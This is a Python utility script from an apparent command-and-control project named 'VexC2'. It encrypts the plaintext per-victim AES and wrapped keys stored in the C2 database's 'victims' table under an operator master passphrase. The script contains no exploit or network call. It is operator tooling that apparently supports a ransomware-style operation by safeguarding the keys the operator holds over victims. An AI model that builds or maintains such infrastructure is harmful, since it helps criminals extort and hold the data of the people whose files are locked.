#!/usr/bin/env python3
"""Seal existing plaintext victim keys in an existing C2 database.

    set VEX_MASTER=your-passphrase   (or create VexC2/.master)
    python tools/vault_migrate.py

Unsealed values become enc:v1:... and can only be revealed while the master
is available. Back up the database first: losing the master loses the keys.
"""

import os
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "VexC2"))

import c2db  # noqa: E402
import vault  # noqa: E402


def main() -> int:
    if not vault.enabled():
        print("[-] no master: set VEX_MASTER or create VexC2/.master first")
        return 2
    sealed = 0
    with c2db.db() as conn:
        rows = conn.execute("SELECT vid, aes_key, wrapped_key FROM victims").fetchall()
        for v in rows:
            aes = vault.seal(v["aes_key"])
            wrapped = vault.seal(v["wrapped_key"])
            if aes != v["aes_key"] or wrapped != v["wrapped_key"]:
                conn.execute("UPDATE victims SET aes_key=?, wrapped_key=? WHERE vid=?",
                             (aes, wrapped, v["vid"]))
                sealed += 1
        conn.commit()
    print(f"[+] sealed {sealed}/{len(rows)} victim rows")
    return 0


if __name__ == "__main__":
    sys.exit(main())
